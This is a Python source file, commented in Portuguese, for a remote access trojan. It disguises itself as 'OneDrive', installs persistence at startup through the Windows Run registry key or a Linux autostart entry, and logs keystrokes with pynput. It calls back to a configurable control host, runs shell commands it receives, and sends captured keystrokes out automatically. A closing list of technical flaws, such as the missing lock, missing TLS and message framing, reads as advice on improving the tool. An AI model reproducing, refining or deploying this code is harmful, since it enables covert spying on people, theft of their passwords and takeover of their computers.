Import os
import platform
import shutil
import socket
import subprocess
import sys
from datetime import datetime
from time import sleep
from pynput import keyboard

# Identifica o Sistema Operacional
CURRENT_OS = platform.system()  # Retorna 'Windows' ou 'Linux'

# Importa winreg apenas se estiver rodando no Windows
if CURRENT_OS == "Windows":
    import winreg

# Configurações de Conexão
IP = "enter_ip_here"
PORT = 443

# Configurações do Programa
PROGRAM_NAME = "OneDrive"
MAX_BUFFER_SIZE = 300

# Estado Global
keylog_buffer = []
buffer_auto_send_pending = False
keylogger_active = False
listener = None


# ==========================================
# 1. CENTRAL DE COMANDOS
# ==========================================
def get_help_menu():
    return (
        "\n==================================================\n"
        f"        CENTRAL DE COMANDOS - SO: {CURRENT_OS.upper()}\n"
        "==================================================\n"
        " [/keylog start]      - Inicia a captura de teclas\n"
        " [/keylog stop]       - Para a captura de teclas\n"
        " [/keylog dump]       - Exibe e limpa o buffer do keylogger\n"
        " [/keylog status]     - Mostra o status do keylogger\n"
        "--------------------------------------------------\n"
        " [/persistence setup] - Instala a inicializacao automatica\n"
        " [/persistence status]- Verifica status da persistencia\n"
        "--------------------------------------------------\n"
        " [/help]              - Exibe esta central de comandos\n"
        " [/exit]              - Encerra a conexao atual\n"
        " [cd <caminho>]       - Altera o diretorio de trabalho\n"
        " [<comando>]          - Executa comando no Shell do sistema\n"
        "==================================================\n\n"
    )


# ==========================================
# 2. PERSISTÊNCIA (WINDOWS / LINUX)
# ==========================================
def get_linux_autostart_path():
    """Retorna o caminho do arquivo de autostart no Linux (~/.config/autostart/)."""
    home = os.path.expanduser("~")
    autostart_dir = os.path.join(home, ".config", "autostart")
    os.makedirs(autostart_dir, exist_ok=True)
    return os.path.join(autostart_dir, f"{PROGRAM_NAME}.desktop")


def check_persistence():
    """Verifica se a inicialização automática está configurada no SO atual."""
    if CURRENT_OS == "Windows":
        try:
            reg_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_path, 0, winreg.KEY_READ)
            winreg.QueryValueEx(key, PROGRAM_NAME)
            winreg.CloseKey(key)
            return True
        except Exception:
            return False

    elif CURRENT_OS == "Linux":
        desktop_file = get_linux_autostart_path()
        return os.path.exists(desktop_file)

    return False


def setup_persistence():
    """Aplica a persistência dependendo do Sistema Operacional."""
    try:
        if check_persistence():
            return True

        current_file = os.path.abspath(sys.executable)

        # Configuração para Windows
        if CURRENT_OS == "Windows":
            appdata = os.getenv("APPDATA")
            if not appdata:
                return False

            appdata_path = os.path.join(appdata, "Microsoft", "Windows")
            os.makedirs(appdata_path, exist_ok=True)
            dest = os.path.join(appdata_path, f"{PROGRAM_NAME}.exe")

            if current_file != dest:
                shutil.copy2(current_file, dest)

            reg_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_path, 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, PROGRAM_NAME, 0, winreg.REG_SZ, dest)
            winreg.CloseKey(key)
            return True

        # Configuração para Linux
        elif CURRENT_OS == "Linux":
            desktop_file = get_linux_autostart_path()
            python_path = sys.executable
            script_path = os.path.abspath(__file__)

            content = (
                "[Desktop Entry]\n"
                "Type=Application\n"
                f"Name={PROGRAM_NAME}\n"
                f"Exec={python_path} {script_path}\n"
                "Hidden=false\n"
                "NoDisplay=false\n"
                "X-GNOME-Autostart-enabled=true\n"
            )
            with open(desktop_file, "w") as f:
                f.write(content)
            return True

    except Exception as e:
        print(f"[-] Erro ao configurar persistencia no {CURRENT_OS}: {e}")
        return False


# ==========================================
# 3. CAPTURA DE TECLAS (KEYLOGGER)
# ==========================================
def format_key(key):
    """Mapeia teclas normais e especiais."""
    try:
        return key.char
    except AttributeError:
        special_key = {
            keyboard.Key.space: " ",
            keyboard.Key.enter: "[ENTER]\n",
            keyboard.Key.tab: "[TAB]\n",
            keyboard.Key.backspace: "[BACKSPACE]\n",
            keyboard.Key.shift: "",
            keyboard.Key.shift_r: "",
            keyboard.Key.ctrl: "",
            keyboard.Key.ctrl_r: "",
            keyboard.Key.alt: "",
            keyboard.Key.alt_r: "",
        }
        return special_key.get(key, f"[{str(key).replace('Key.', '').upper()}]")


def on_press(key):
    global keylog_buffer, buffer_auto_send_pending
    formatted = format_key(key)
    if formatted:
        keylog_buffer.append(formatted)

    if len(keylog_buffer) >= MAX_BUFFER_SIZE:
        buffer_auto_send_pending = True


def get_keylog_data():
    global keylog_buffer
    if not keylog_buffer:
        return "[i] Buffer do keylogger está vazio"

    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    data = f"[+] Teclas capturadas em {timestamp}:\n{''.join(keylog_buffer)}"
    keylog_buffer = []
    return data


def start_keylogger():
    global keylogger_active, listener
    if keylogger_active:
        return "[i] Keylogger ja esta ativo"

    listener = keyboard.Listener(on_press=on_press)
    listener.start()
    keylogger_active = True
    return "[+] Keylogger iniciado"


def stop_keylogger():
    global keylogger_active, listener
    if not keylogger_active:
        return "[i] Keylogger nao esta rodando"

    if listener is not None:
        listener.stop()
        listener = None

    keylogger_active = False
    return "[+] Keylogger parado"


# ==========================================
# 4. REDE E EXECUÇÃO DE COMANDOS (C2)
# ==========================================
def connect(ip, port):
    try:
        c = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        c.connect((ip, port))

        welcome = f"[#] Cliente conectado ({CURRENT_OS})!\n" + get_help_menu()
        c.send(welcome.encode("utf-8"))
        return c
    except Exception as e:
        print(f"[!] Erro de conexao: {e}")
        return None


def cmd(c, data):
    try:
        if not data:
            return

        if data == "/help":
            c.send(get_help_menu().encode("utf-8"))
            return

        elif data.startswith("cd "):
            path = data[3:].strip()
            try:
                os.chdir(path)
                c.send(f"[i] Diretorio alterado para: {os.getcwd()}\n\n".encode("utf-8"))
            except Exception as err:
                c.send(f"[-] Erro ao mudar de diretorio: {err}\n\n".encode("utf-8"))
            return

        elif data == "/persistence status":
            status_str = "ATIVA" if check_persistence() else "INATIVA"
            c.send(f"[+] Status da Persistencia ({CURRENT_OS}): {status_str}\n\n".encode("utf-8"))
            return

        elif data == "/persistence setup":
            if setup_persistence():
                c.send(b"[+] Persistencia configurada com sucesso\n\n")
            else:
                c.send(b"[-] Falha ao configurar persistencia\n\n")
            return

        elif data == "/keylog start":
            response = start_keylogger()
            c.send(response.encode("utf-8") + b"\n\n")
            return

        elif data == "/keylog stop":
            response = stop_keylogger()
            c.send(response.encode("utf-8") + b"\n\n")
            return

        elif data == "/keylog status":
            status = "Ativo" if keylogger_active else "Parado"
            buffer_size = len(keylog_buffer)
            response = f"[i] Status do Keylogger ({CURRENT_OS}): {status}\n[i] Buffer: {buffer_size} teclas"
            c.send(response.encode("utf-8") + b"\n\n")
            return

        elif data == "/keylog dump":
            response = get_keylog_data()
            c.send(response.encode("utf-8") + b"\n\n")
            return

        else:
            # Executa o comando no Shell do sistema (CMD no Windows / Bash no Linux)
            p = subprocess.Popen(
                data,
                shell=True,
                stdin=subprocess.PIPE,
                stderr=subprocess.PIPE,
                stdout=subprocess.PIPE,
            )
            stdout_data, stderr_data = p.communicate()
            output = stdout_data + stderr_data

            if output:
                c.send(output + b"\n")
            else:
                c.send(b"[+] Comando executado sem retorno visual\n\n")

    except Exception as e:
        err_msg = f"[-] Erro ao executar comando: {e}\n\n"
        c.send(err_msg.encode("utf-8"))


def listen(c):
    global buffer_auto_send_pending

    try:
        while True:
            if buffer_auto_send_pending:
                data = get_keylog_data()
                c.send(f"[AUTO-SENDING] {data}\n".encode("utf-8"))
                buffer_auto_send_pending = False

            c.settimeout(0.5)

            try:
                raw_data = c.recv(1024)
                if not raw_data:
                    break

                data = raw_data.decode("utf-8", errors="ignore").strip()

                if data == "/exit":
                    break

                cmd(c, data)

            except socket.timeout:
                continue

    except Exception as e:
        print(f"[!] Erro no loop de escuta: {e}")

    finally:
        c.close()


if __name__ == "__main__":
    try:
        # Configura a persistência ao iniciar
        setup_persistence()

        # Loop de reconexão contínua
        while True:
            client = connect(IP, PORT)
            if client:
                listen(client)
            else:
                sleep(5)

    except KeyboardInterrupt:
        print("[!] Interrompido pelo usuario.")
    except Exception as error:
        print(f"[!] Erro principal: {error}")


Windows: winreg existe, mas a rotina de persistência tenta copiar sys.executable; se estiver executando como .py, isso pode apontar para o interpretador Python em vez do próprio script.
Linux: o .desktop pode ser criado, mas Exec= precisa lidar corretamente com caminhos contendo espaços e com diferenças entre ambientes gráficos.
Keylogger: pynput não funciona igualmente em todos os ambientes Linux; especialmente Wayland há restrições importantes.
Concorrência: keylog_buffer é acessado por threads diferentes sem Lock, podendo haver condições de corrida.
Rede: não há TLS, autenticação nem protocolo robusto de mensagens.
C2: recv(1024) não garante que uma mensagem inteira chegará em uma única leitura.
Reconexão: depois de uma conexão cair, ele tenta novamente indefinidamente a cada 5 segundos.
